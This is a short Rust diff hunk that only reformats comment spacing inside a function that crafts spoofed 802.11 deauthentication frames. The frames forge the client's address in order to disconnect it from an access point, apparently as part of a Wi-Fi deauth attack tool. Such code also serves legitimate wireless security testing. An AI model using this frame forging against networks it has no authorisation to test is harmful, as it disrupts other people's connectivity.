@@ -44,10 +44,10 @@ pub fn craft_bidirectional_deauth(
     // 2. Client -> AP (Reason 3: Deauthenticated because sending STA is leaving)
     let mut client_to_ap = Vec::with_capacity(26);
     client_to_ap.extend_from_slice(&[0xc0, 0x00, 0x3a, 0x01]);
-    client_to_ap.extend_from_slice(&ap_bssid.0);       // Receiver: AP
-    client_to_ap.extend_from_slice(&target_client.0);  // Transmitter: Client
-    client_to_ap.extend_from_slice(&ap_bssid.0);       // BSSID: AP
-    client_to_ap.extend_from_slice(&[0x00, 0x00]);     // Seq
+    client_to_ap.extend_from_slice(&ap_bssid.0); // Receiver: AP
+    client_to_ap.extend_from_slice(&target_client.0); // Transmitter: Client
+    client_to_ap.extend_from_slice(&ap_bssid.0); // BSSID: AP
+    client_to_ap.extend_from_slice(&[0x00, 0x00]); // Seq
     client_to_ap.extend_from_slice(&3u16.to_le_bytes()); // Reason 3
 
     (ap_to_client, client_to_ap)
